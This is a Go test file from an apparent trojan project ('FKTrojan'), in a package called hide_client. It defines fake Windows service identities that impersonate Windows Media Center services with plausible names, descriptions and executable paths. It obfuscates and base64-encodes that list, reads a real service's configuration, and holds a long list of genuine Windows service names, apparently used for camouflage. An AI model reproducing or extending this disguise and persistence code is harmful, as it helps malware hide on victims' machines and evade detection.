package hide_client

import (
	"testing"

	"encoding/json"

	"FKTrojan/common"

	"golang.org/x/sys/windows/svc/mgr"
)

func TestGetSIsString(t *testing.T) {

	s, err := json.MarshalIndent(ServiceInfoTest, "", " ")
	if err != nil {
		return
	}
	t.Log(string(common.Obfuscate(common.Base64Encode(string(s)))))

}
func TestRandomSI(t *testing.T) {
	t.Log(randomSI())
}
func getOneService(name string) (*ServiceInfo, error) {
	m, err := mgr.Connect()
	if err != nil {
		return nil, err
	}
	defer m.Disconnect()
	s, err := m.OpenService(name)
	if err != nil {
		return nil, err
	}
	defer s.Close()
	config, err := s.Config()
	if err != nil {
		return nil, err
	}
	return &ServiceInfo{
		Name:        name,
		Desc:        config.Description,
		DisplayName: config.DisplayName,
		Path:        config.BinaryPathName,
	}, nil
}
func TestGetCurrentService(t *testing.T) {
	si, err := getOneService("sppsvc")
	if err != nil {
		return
	}
	t.Logf("%#v", si)
}

var (
	ServiceInfoTest = []ServiceInfo{
		{
			Name:        "ehControl",
			DisplayName: "Windows Media Center Controller Service",
			Desc:        "在 Windows Media Center 中控制录制电视节目",
			Path:        "C:\\Windows\\ehome\\ehcontrol.exe",
			Args:        []string{},
			Version:     VERSION,
		}, {
			Name:        "ehCollector",
			DisplayName: "Windows Media Center Collector Service",
			Desc:        "在 Windows Media Center 中收集分析电视节目",
			Path:        "C:\\Windows\\ehome\\ehcollector.exe",
			Args:        []string{},
			Version:     VERSION,
		}, {
			Name:        "ehManager",
			DisplayName: "Windows Media Center Management Service",
			Desc:        "在 Windows Media Center 中管理电视节目",
			Path:        "C:\\Windows\\ehome\\ehmgr.exe",
			Args:        []string{},
			Version:     VERSION,
		},
	}
	currentSvrList = []string{
		"AdobeFlashPlayerUpdateSvc",
		"AeLookupSvc",
		"ALG",
		"AppIDSvc",
		"Appinfo",
		"AppMgmt",
		"aspnet_state",
		"atestservice",
		"AudioEndpointBuilder",
		"AudioSrv",
		"AxInstSV",
		"BDESVC",
		"BFE",
		"BITS",
		"Browser",
		"bthserv",
		"CcmExec",
		"CertPropSvc",
		"client_service",
		"CmRcService",
		"CNCBUK2WDMon",
		"COMSysApp",
		"cphs",
		"CryptSvc",
		"CscService",
		"DcomLaunch",
		"defragsvc",
		"Device",
		"DgAwEncx",
		"Dhcp",
		"DiagTrack",
		"Dnscache",
		"dot3svc",
		"DPS",
		"EapHost",
		"EFS",
		"ehRecvr",
		"ehSched",
		"eventlog",
		"EventSystem",
		"Fax",
		"fdPHost",
		"FDResPub",
		"FlexNet",
		"FontCache",
		"FoxitReaderService",
		"ftnlsv3hv",
		"ftscanmgrhv",
		"ftusbsrvc",
		"fussvc",
		"gpsvc",
		"gupdate",
		"gupdatem",
		"hidserv",
		"hkmsvc",
		"HomeGroupListener",
		"HomeGroupProvider",
		"idsvc",
		"IEEtwCollectorService",
		"IKEEXT",
		"ImeDictUpdateService",
		"IngressMgr",
		"Intel ( R )",
		"IPBusEnum",
		"iphlpsvc",
		"jhi_service",
		"KeyIso",
		"KtmRm",
		"LanmanServer",
		"LanmanWorkstation",
		"lltdsvc",
		"lmhosts",
		"LMS",
		"lpasvc",
		"lppsvc",
		"Mcx2Svc",
		"Microsoft",
		"MMCSS",
		"MozillaMaintenance",
		"MpsSvc",
		"MSDTC",
		"MSiSCSI",
		"msiserver",
		"MySQL57",
		"MySQLRouter",
		"napagent",
		"Netlogon",
		"Netman",
		"NetMsmqActivator",
		"NetPipeActivator",
		"netprofm",
		"NetTcpActivator",
		"NetTcpPortSharing",
		"ngSlotD",
		"NlaSvc",
		"nsi",
		"ObserveIT",
		"OnKey",
		"ose64",
		"osppsvc",
		"p2pimsvc",
		"p2psvc",
		"PcaSvc",
		"PeerDistSvc",
		"PerfHost",
		"pla",
		"PlugPlay",
		"PNRPAutoReg",
		"PNRPsvc",
		"PolicyAgent",
		"Power",
		"ProfSvc",
		"ProtectedStorage",
		"QWAVE",
		"RasAuto",
		"RasMan",
		"RemoteAccess",
		"RemoteRegistry",
		"rpcapd",
		"RpcEptMapper",
		"RpcLocator",
		"RpcSs",
		"RtkAudioService",
		"SamSs",
		"SCardSvr",
		"Schedule",
		"SCPolicySvc",
		"SDRSVC",
		"seclogon",
		"SENS",
		"SensrSvc",
		"SepMasterService",
		"SessionEnv",
		"SharedAccess",
		"ShellHWDetection",
		"smstsmgr",
		"SNAC",
		"SNMPTRAP",
		"SogouSvc",
		"Spooler",
		"sppsvc",
		"sppuinotify",
		"SQLWriter",
		"SSDPSRV",
		"SstpSvc",
		"stisvc",
		"StorSvc",
		"swprv",
		"SysMain",
		"TabletInputService",
		"TapiSrv",
		"TermService",
		"Themes",
		"THREADORDER",
		"TrkWks",
		"TrustedInstaller",
		"UI0Detect",
		"UmRdpService",
		"UNS",
		"upnphost",
		"UxSms",
		"VaultSvc",
		"vds",
		"VMUSBArbService",
		"vmwsprrdpwks",
		"VSS",
		"VSStandardCollectorService140",
		"W32Time",
		"WatAdminSvc",
		"wbengine",
		"WbioSrvc",
		"wcncsvc",
		"WcsPlugInService",
		"WdiServiceHost",
		"WdiSystemHost",
		"WebClient",
		"Wecsvc",
		"wercplsupport",
		"WerSvc",
		"WinDefend",
		"WinHttpAutoProxySvc",
		"Winmgmt",
		"WinRM",
		"Wlansvc",
		"wmiApSrv",
		"WMPNetworkSvc",
		"WPCSvc",
		"WPDBusEnum",
		"wscsvc",
		"WSearch",
		"wuauserv",
		"wudfsvc",
		"WwanSvc",
	}
)
